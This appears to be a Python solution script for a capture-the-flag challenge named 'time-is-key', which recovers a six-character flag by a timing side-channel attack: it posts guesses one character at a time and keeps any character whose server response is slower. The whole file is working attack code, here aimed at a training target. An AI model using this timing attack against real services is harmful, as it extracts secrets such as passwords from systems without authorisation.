import requests
import string

url = "http://time-is-key.challs.olicyber.it/index.php"

def infer_flag():
    flag = ""

    print("Starting flag inference process...")

    while len(flag) < 6:
        print(f"Trying characters for position {len(flag) + 1}...")

        found = False
        
        for char in string.printable:
            if char not in string.whitespace:
                payload = {'flag': flag + char + 'a' * (5 - len(flag))}
                response = requests.post(url, data=payload)
                
                if response.elapsed.total_seconds() > 1 + len(flag):
                    flag += char
                    print(f"Found character for position {len(flag)}: {char}")
                    found = True
                    break
                else:
                    print(f"No character found for position {len(flag) + 1}: {char}")
        
        if not found:
            print(f"No valid character found for position {len(flag) + 1}")
            break

    print("Flag inference process completed!")
    return flag

print("Inferred flag:", infer_flag())
